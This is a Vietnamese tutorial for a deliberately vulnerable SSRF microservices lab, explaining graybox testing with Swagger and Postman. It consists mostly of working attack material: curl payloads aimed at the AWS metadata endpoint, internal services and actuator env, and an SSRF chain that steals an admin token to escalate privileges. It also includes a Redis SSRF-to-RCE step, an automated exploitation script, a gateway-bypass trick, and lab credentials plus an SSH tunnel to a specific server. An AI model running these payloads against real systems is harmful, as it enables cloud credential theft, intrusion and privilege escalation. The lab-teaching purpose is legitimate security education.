# Hướng Dẫn Graybox Testing - SSRF Lab

## Khái Niệm Graybox Testing

**Graybox Testing** là phương pháp kiểm tra bảo mật nằm giữa Blackbox và Whitebox:
- Có **API documentation** (Swagger/Postman)
- Biết **endpoints và parameters** 
- Không có **source code**
- Tập trung vào **business logic vulnerabilities**

## Bạn Cần Cung Cấp Gì Cho Tool?

### Input Yêu Cầu

| Tool | Bạn Cần Cung Cấp | Tool Sẽ Trả Về |
|------|------------------|----------------|
| **Swagger UI** | • URL của service (`https://quangtx.io.vn`)<br>• JWT Token (sau khi login) | • Danh sách tất cả API endpoints<br>• Parameters của mỗi endpoint<br>• Request/Response format<br>• "Try it out" để test trực tiếp |
| **Postman Collection** | • Import file `postman-collection.json`<br>• Set biến: BASE_URL, USERNAME, PASSWORD | • Tự động gửi requests<br>• Auto-save JWT token<br>• Pre-configured SSRF payloads<br>• Response preview |
| **Swagger JSON API** | • `curl http://localhost:8082/swagger.json` | • JSON schema với tất cả endpoints<br>• Parameter definitions<br>• Response schemas |

### Quy Trình Cụ Thể

```
┌─────────────────────────────────────────────────────────────┐
│ BƯỚC 1: BẠN CUNG CẤP                                        │
├─────────────────────────────────────────────────────────────┤
│ • URL server: https://quangtx.io.vn                        │
│ • Username/Password: graybox_test / Test@123               │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ BƯỚC 2: TOOL TỰ ĐỘNG LẤY THÔNG TIN                         │
├─────────────────────────────────────────────────────────────┤
│ Swagger JSON → Parser → Endpoints List                     │
│                                                             │
│ Tool phát hiện:                                             │
│ ✓ /api/products/1/check-price/                            │
│   • Parameter: compare_url (string, optional)              │
│   • Method: GET, POST                                       │
│   • Auth: Bearer Token required                            │
│                                                             │
│ ✓ /api/products/1/fetch-review/                           │
│   • Parameter: review_url (string, optional)               │
│   • Method: GET, POST                                       │
│                                                             │
│ ✓ /api/products/1/share/                                   │
│   • Parameter: share_api_url (string, required)            │
│   • Method: POST                                            │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ BƯỚC 3: TOOL TỰ ĐỘNG TEST                                  │
├─────────────────────────────────────────────────────────────┤
│ For each endpoint:                                          │
│   For each parameter:                                       │
│     Test SSRF payloads:                                     │
│       ✓ http://169.254.169.254/latest/meta-data/          │
│       ✓ http://localhost:8082/actuator/health              │
│       ✓ http://user-service:8081/api/users                 │
│       ✓ http://inventory-service:5000/inventory/1          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ BƯỚC 4: TOOL TRẢ VỀ KẾT QUẢ                                │
├─────────────────────────────────────────────────────────────┤
│ {                                                           │
│   "vulnerable": true,                                       │
│   "endpoint": "/api/products/1/check-price/",             │
│   "parameter": "compare_url",                               │
│   "payload": "http://169.254.169.254/latest/meta-data/",   │
│   "response": "ami-id\nami-launch-index\n...",             │
│   "severity": "CRITICAL"                                    │
│ }                                                           │
└─────────────────────────────────────────────────────────────┘
```

## Quy Trình Graybox Testing

### 1. API Discovery (Khám Phá API)

#### A. Swagger UI - MANUAL TESTING

**📥 Input bạn cần cung cấp:**
```bash
# SSH tunnel để truy cập Swagger
ssh -p 24700 -L 8082:localhost:8082 quang@103.56.163.193
# Password: [mật khẩu SSH của bạn]
```

**📤 Output tool trả về:**
- **Swagger UI Web Interface** tại: `http://localhost:8082/swagger/`
- Danh sách tất cả endpoints có sẵn
- Chi tiết từng parameter (name, type, required)
- "Try it out" button để test trực tiếp

**🔍 Cách tool phát hiện SSRF:**
1. Bạn mở Swagger UI trong browser
2. Tìm các endpoint có parameters chứa "url", "uri", "link", "webhook"
3. Click "Try it out"
4. Nhập SSRF payload vào parameter
5. Click "Execute"
6. Xem response → Nếu trả về nội dung từ internal URL = SSRF

**Ví dụ cụ thể:**
```
Input của bạn:
  • Endpoint: /api/products/1/check-price/
  • Parameter: compare_url = http://169.254.169.254/latest/meta-data/
  • Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Output tool trả về:
  {
    "product_price": 100.00,
    "compared_price": "ami-id\nami-launch-index\nami-manifest-path\n...",
    "compare_url": "http://169.254.169.254/latest/meta-data/"
  }
  
Kết luận: ✅ SSRF vulnerable! Tool đã fetch được AWS metadata
```

#### B. Swagger JSON - AUTOMATED SCANNING

**📥 Input bạn cần cung cấp:**
```bash
# Command để lấy Swagger JSON
ssh -p 24700 quang@103.56.163.193 \
  "curl -s http://localhost:8082/swagger.json"
```

**📤 Output tool trả về:**
```json
{
  "swagger": "2.0",
  "info": {...},
  "paths": {
    "/api/products/{id}/check-price/": {
      "get": {
        "parameters": [
          {
            "name": "compare_url",
            "in": "query",
            "type": "string",
            "required": false
          }
        ]
      }
    }
  }
}
```

**🔍 Cách tool phát hiện SSRF (tự động):**

```bash
#!/bin/bash
# Tool tự động parse Swagger JSON

# 1. BẠN CUNG CẤP: Swagger JSON URL
SWAGGER_URL="http://localhost:8082/swagger.json"

# 2. TOOL LẤY: Danh sách endpoints
ENDPOINTS=$(curl -s $SWAGGER_URL | jq -r '.paths | keys[]')
# Output: /api/products/1/check-price/
#         /api/products/1/fetch-review/
#         /api/products/1/share/

# 3. TOOL PHÁT HIỆN: Parameters có chứa "url"
for endpoint in $ENDPOINTS; do
  PARAMS=$(curl -s $SWAGGER_URL | jq -r ".paths.\"$endpoint\".get.parameters[]? | select(.name | contains(\"url\")) | .name")
  
  # Nếu tìm thấy parameter có "url" trong tên
  if [ ! -z "$PARAMS" ]; then
    echo "🚨 Potential SSRF: $endpoint"
    echo "   Parameter: $PARAMS"
  fi
done

# 4. TOOL TRẢ VỀ:
# 🚨 Potential SSRF: /api/products/1/check-price/
#    Parameter: compare_url
# 🚨 Potential SSRF: /api/products/1/fetch-review/
#    Parameter: review_url
# 🚨 Potential SSRF: /api/products/1/share/
#    Parameter: share_api_url
```

### 2. Authentication & Token

```bash
# Register user
curl -X POST https://quangtx.io.vn/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "graybox_test",
    "password": "Test@123",
    "email": "test@example.com"
  }'

# Login và lấy token
TOKEN=$(curl -X POST https://quangtx.io.vn/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "graybox_test",
    "password": "Test@123"
  }' | jq -r '.token')

echo "Token: $TOKEN"
```

### 3. Test SSRF với Swagger Documentation

#### A. Từ Swagger, ta biết:
- Endpoint: `/api/products/{id}/check-price/`
- Parameter: `compare_url` (string)
- Method: GET hoặc POST
- Authentication: Bearer Token

#### B. Test AWS Metadata
```bash
# Test metadata endpoint
curl -X GET "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer $TOKEN"
```

**Kết quả mong đợi:**
```json
{
  "product_price": 100.00,
  "compared_price": "<AWS metadata content>",
  "compare_url": "http://169.254.169.254/latest/meta-data/"
}
```

#### C. Test Internal Services
```bash
# Scan user-service
curl -X GET "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://user-service:8081/api/users" \
  -H "Authorization: Bearer $TOKEN"

# Scan inventory-service
curl -X GET "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://inventory-service:5000/inventory/1" \
  -H "Authorization: Bearer $TOKEN"
```

#### D. Test localhost Services
```bash
# Scan product-service actuator
curl -X GET "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://localhost:8082/actuator/health" \
  -H "Authorization: Bearer $TOKEN"
```

### 4. Sử Dụng Postman Collection

#### A. Import Collection

**📥 Input bạn cần cung cấp:**
1. Mở Postman Desktop
2. Click **Import** → **File**
3. Chọn file: `postman-collection.json`
4. Click **Import**

**📤 Output tool trả về:**
- Collection "SSRF Vulnerable Microservices Lab" với 5 folders:
  - 📁 Authentication (Register, Login)
  - 📁 SSRF Vulnerabilities (3 vulnerable endpoints)
  - 📁 Exploitation Examples (5 attack scenarios)
  - 📁 API Gateway Tests (bypass tests)
  - 📁 Normal API Endpoints (legitimate requests)

#### B. Configure Variables

**📥 Bạn cần set các biến:**
```
Collection Variables:
├── BASE_URL: https://quangtx.io.vn
├── LOCAL_URL: http://localhost:8080  
├── USERNAME: graybox_test
└── PASSWORD: Test@123
```

**Cách set:**
1. Click vào Collection name
2. Tab **Variables**
3. Điền **Current Value** cho mỗi biến
4. Click **Save**

#### C. Tool Tự Động Làm Gì?

**🤖 Postman Auto Features:**

```javascript
// 1. Auto-save JWT Token sau khi login
// Request: Login
// Tab "Tests" có sẵn script:

pm.test("Save token", function() {
    var jsonData = pm.response.json();
    pm.collectionVariables.set("TOKEN", jsonData.token);
    // ↑ Tool tự động lưu token vào biến
});

// 2. Auto-inject Token vào tất cả requests
// Tab "Authorization" → Type: Bearer Token
// Token: {{TOKEN}}
// ↑ Tool tự động thay thế {{TOKEN}} bằng giá trị thực

// 3. Pre-configured SSRF Payloads
// Request: "Check Price - AWS Metadata"
// URL: {{BASE_URL}}/api/products/1/check-price/
// Params: compare_url = http://169.254.169.254/latest/meta-data/
// ↑ Tool đã config sẵn, bạn chỉ cần click Send
```

#### D. Workflow Cụ Thể

**📥 Input của bạn:**
```
Bước 1: Click "Register" request → Send
  • Tool gửi: POST /api/auth/register
  • Body: {"username": "graybox_test", "password": "Test@123"}

Bước 2: Click "Login" request → Send  
  • Tool gửi: POST /api/auth/login
  • Body: {"username": "graybox_test", "password": "Test@123"}
  
Bước 3: Click "Check Price - AWS Metadata" → Send
  • Tool gửi: GET /api/products/1/check-price/?compare_url=...
  • Header: Authorization: Bearer {{TOKEN}}
```

**📤 Output tool trả về:**

```json
// Response từ "Check Price - AWS Metadata":
{
  "product_price": 100.00,
  "compared_price": "ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\niam/\n...",
  "compare_url": "http://169.254.169.254/latest/meta-data/"
}

// Tool hiển thị:
Status: 200 OK ✅
Time: 324ms
Size: 1.2 KB

// Tab "Body" (Pretty):
{
  "product_price": 100.00,
  "compared_price": "<AWS metadata here>" ← SSRF thành công!
}
```

#### E. Test Tất Cả SSRF Endpoints

**🤖 Postman Collection Runner:**

**📥 Bạn làm:**
1. Click vào folder **"SSRF Vulnerabilities"**
2. Click nút **Run** (⊳)
3. Select tất cả requests
4. Click **Run SSRF Vulnerabilities**

**📤 Tool tự động:**
```
Running 8 requests:

✅ Check Price - AWS Metadata          200 OK  [VULNERABLE]
✅ Check Price - Internal User Service 200 OK  [VULNERABLE]
✅ Check Price - Inventory Service     200 OK  [VULNERABLE]
✅ Fetch Review - Local File           200 OK  [VULNERABLE]
✅ Fetch Review - Actuator Health      200 OK  [VULNERABLE]
✅ Share Product - Webhook SSRF        200 OK  [VULNERABLE]
✅ Share - Internal Service POST       200 OK  [VULNERABLE]
✅ Share - Privilege Escalation        403 Forbidden [BLOCKED]

Summary:
  7/8 requests vulnerable to SSRF
  1/8 blocked by authentication
```

**Tool phát hiện SSRF như thế nào?**

```javascript
// Postman Tests Script (tự động chạy sau mỗi request)

pm.test("Check for SSRF vulnerability", function() {
    var response = pm.response.json();
    
    // 1. Kiểm tra response có chứa internal data không
    if (response.compared_price || response.review || response.share_result) {
        // 2. Kiểm tra nội dung có từ internal services
        var body = JSON.stringify(response);
        
        if (body.includes("ami-") || 
            body.includes("user-service") ||
            body.includes("inventory") ||
            body.includes("actuator")) {
            
            console.log("🚨 SSRF VULNERABLE!");
            console.log("Leaked data:", body.substring(0, 200));
        }
    }
});
```

### 5. Exploitation Examples

#### A. Read Internal Configuration
```bash
# Đọc environment variables của product-service
curl -X GET "https://quangtx.io.vn/api/products/1/fetch-review/?review_url=http://localhost:8082/actuator/env" \
  -H "Authorization: Bearer $TOKEN"
```

#### B. SSRF Chain - Privilege Escalation
```bash
# 1. Lấy admin token từ internal service
curl -X GET "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://user-service:8081/api/admin/token" \
  -H "Authorization: Bearer $TOKEN"

# 2. Sử dụng admin token để truy cập admin API
ADMIN_TOKEN="<token_from_step_1>"
curl -X GET "https://quangtx.io.vn/api/users/all" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

#### C. SSRF to RCE (nếu có vulnerable service)
```bash
# Nếu có Redis không xác thực
curl -X POST "https://quangtx.io.vn/api/products/1/share/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "share_api_url": "http://localhost:6379",
    "payload": "CONFIG SET dir /var/www/html"
  }'
```

## So Sánh: Blackbox vs Graybox

### Blackbox Testing (Không có docs)
```bash
# Phải fuzzing để tìm parameters
ffuf -u "https://quangtx.io.vn/api/products/1/check-price/?FUZZ=http://127.0.0.1" \
  -w params.txt -H "Authorization: Bearer $TOKEN"

# Kết quả:
# - Mất thời gian fuzzing
# - Có thể miss parameters ít phổ biến
# - Không biết expected format
```

### Graybox Testing (Có Swagger)
```bash
# Từ Swagger, biết ngay:
# - Parameter: compare_url
# - Type: string
# - Required: false
# - Method: GET/POST

# Test trực tiếp:
curl -X GET "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://127.0.0.1" \
  -H "Authorization: Bearer $TOKEN"

# Kết quả:
# ✅ Nhanh hơn 10-100x
# ✅ Không miss parameters
# ✅ Biết format, validation rules
```

## Advanced: Automated Graybox Testing

### Script Tự Động Test Tất Cả SSRF Endpoints

**📥 Input bạn cần cung cấp:**

```bash
#!/bin/bash
# graybox-ssrf-scan.sh

# 1. BẠN CUNG CẤP: Thông tin đăng nhập
USERNAME="graybox_test"
PASSWORD="Test@123"
BASE_URL="https://quangtx.io.vn"
```

**🤖 Tool sẽ tự động làm:**

```bash
# 2. TOOL LẤY TOKEN
echo "[*] Step 1: Getting JWT token..."
TOKEN=$(curl -s -X POST $BASE_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}" \
  | jq -r '.token')

echo "✅ Token obtained: ${TOKEN:0:20}..."

# 3. TOOL TẠO PAYLOADS
echo "[*] Step 2: Preparing SSRF payloads..."
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"           # AWS metadata
  "http://user-service:8081/api/users"                 # Internal service
  "http://inventory-service:5000/inventory/1"          # Inventory service
  "http://localhost:8082/actuator/health"              # Actuator endpoint
  "http://localhost:8082/actuator/env"                 # Environment vars
)

echo "✅ Loaded ${#PAYLOADS[@]} SSRF payloads"

# 4. TOOL TỰ ĐỘNG TEST TỪNG ENDPOINT
echo "[*] Step 3: Testing check_price endpoint..."

RESULTS=()
for payload in "${PAYLOADS[@]}"; do
  echo "  [+] Testing: $payload"
  
  # Encode URL
  ENCODED=$(echo "$payload" | jq -sRr @uri)
  
  # Send request
  RESPONSE=$(curl -s -X GET \
    "$BASE_URL/api/products/1/check-price/?compare_url=$ENCODED" \
    -H "Authorization: Bearer $TOKEN")
  
  # Check if vulnerable
  if echo "$RESPONSE" | jq -e '.compared_price' > /dev/null 2>&1; then
    LEAKED=$(echo "$RESPONSE" | jq -r '.compared_price' | head -c 100)
    
    if [ ! -z "$LEAKED" ] && [ "$LEAKED" != "null" ]; then
      echo "      🚨 VULNERABLE! Leaked data:"
      echo "         $LEAKED..."
      
      RESULTS+=("VULNERABLE|check_price|compare_url|$payload|$LEAKED")
    fi
  fi
  
  sleep 0.5  # Rate limiting
done

# 5. TOOL TRẢ VỀ REPORT
echo ""
echo "========================================="
echo "           SSRF SCAN REPORT"
echo "========================================="
echo ""
echo "Total payloads tested: ${#PAYLOADS[@]}"
echo "Vulnerable findings: ${#RESULTS[@]}"
echo ""

if [ ${#RESULTS[@]} -gt 0 ]; then
  echo "🚨 VULNERABILITIES FOUND:"
  echo ""
  
  for result in "${RESULTS[@]}"; do
    IFS='|' read -r status endpoint param payload leaked <<< "$result"
    echo "  Endpoint: $endpoint"
    echo "  Parameter: $param"
    echo "  Payload: $payload"
    echo "  Leaked Data: ${leaked:0:80}..."
    echo "  ---"
  done
else
  echo "✅ No SSRF vulnerabilities found"
fi

# 6. TOOL XUẤT JSON REPORT
cat > ssrf-scan-results.json << EOF
{
  "scan_date": "$(date -Iseconds)",
  "base_url": "$BASE_URL",
  "total_payloads": ${#PAYLOADS[@]},
  "vulnerabilities": [
$(for result in "${RESULTS[@]}"; do
  IFS='|' read -r status endpoint param payload leaked <<< "$result"
  cat << ITEM
    {
      "endpoint": "$endpoint",
      "parameter": "$param",
      "payload": "$payload",
      "leaked_data_preview": "${leaked:0:100}",
      "severity": "CRITICAL"
    },
ITEM
done | sed '$ s/,$//')
  ]
}
EOF

echo ""
echo "📄 Full report saved to: ssrf-scan-results.json"
```

**📤 Output tool trả về:**

```
[*] Step 1: Getting JWT token...
✅ Token obtained: eyJhbGciOiJIUzI1NiI...

[*] Step 2: Preparing SSRF payloads...
✅ Loaded 5 SSRF payloads

[*] Step 3: Testing check_price endpoint...
  [+] Testing: http://169.254.169.254/latest/meta-data/
      🚨 VULNERABLE! Leaked data:
         ami-id
         ami-launch-index
         ami-manifest-path
         block-device-mapping/...
         
  [+] Testing: http://user-service:8081/api/users
      🚨 VULNERABLE! Leaked data:
         [{"id":1,"username":"admin","email":"admin@example.com"},...
         
  [+] Testing: http://inventory-service:5000/inventory/1
      🚨 VULNERABLE! Leaked data:
         {"product_id":1,"stock":100,"warehouse":"A1"}...

=========================================
           SSRF SCAN REPORT
=========================================

Total payloads tested: 5
Vulnerable findings: 3

🚨 VULNERABILITIES FOUND:

  Endpoint: check_price
  Parameter: compare_url
  Payload: http://169.254.169.254/latest/meta-data/
  Leaked Data: ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/...
  ---
  
  Endpoint: check_price
  Parameter: compare_url
  Payload: http://user-service:8081/api/users
  Leaked Data: [{"id":1,"username":"admin","email":"admin@example.com"},...
  ---

📄 Full report saved to: ssrf-scan-results.json
```

**JSON Report Output:**

```json
{
  "scan_date": "2025-12-03T15:30:45+00:00",
  "base_url": "https://quangtx.io.vn",
  "total_payloads": 5,
  "vulnerabilities": [
    {
      "endpoint": "check_price",
      "parameter": "compare_url",
      "payload": "http://169.254.169.254/latest/meta-data/",
      "leaked_data_preview": "ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/events/hostname/iam/...",
      "severity": "CRITICAL"
    },
    {
      "endpoint": "check_price",
      "parameter": "compare_url",
      "payload": "http://user-service:8081/api/users",
      "leaked_data_preview": "[{\"id\":1,\"username\":\"admin\",\"email\":\"admin@example.com\"},{\"id\":2,\"username\":\"user\"...",
      "severity": "CRITICAL"
    }
  ]
}
```

## Tips & Tricks

### 1. Bypass API Gateway với Swagger Knowledge
```bash
# Gateway block direct IP, nhưng không block encoded URL
# Swagger cho biết endpoint accept URL encoding

# Bị block:
curl "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://127.0.0.1"

# Bypass bằng URL encoding:
curl "https://quangtx.io.vn/api/products/1/check-price/?compare_url=http://127.0.0.1%23@example.com"
```

### 2. Sử Dụng Swagger "Try it out"
- Click "Authorize" → Nhập Bearer Token
- Click "Try it out" trên endpoint
- Nhập SSRF payload vào parameter
- Click "Execute"
- Xem response trực tiếp trong Swagger UI

### 3. Export Postman Test Results
```bash
# Run collection với Newman
newman run postman-collection.json \
  --environment postman-env.json \
  --reporters cli,json \
  --reporter-json-export results.json

# Parse results
jq '.run.executions[] | {request: .item.name, status: .response.code}' results.json
```

## Kết Luận

**Ưu điểm Graybox:**
- ✅ Nhanh hơn blackbox 10-100x
- ✅ Không miss vulnerabilities do không biết parameters
- ✅ Có thể test business logic phức tạp
- ✅ Dễ dàng reproduce và document

**Khi nào dùng Graybox:**
- Có Swagger/Postman/API docs
- Internal pentest (được cấp docs)
- Bug bounty programs có API docs
- Security assessment cho microservices

**Bước tiếp theo:**
- Chạy `sast-scan.sh` cho whitebox testing
- Kết hợp với fuzzing tool (ffuf, burp intruder)
- Automate với CI/CD pipeline
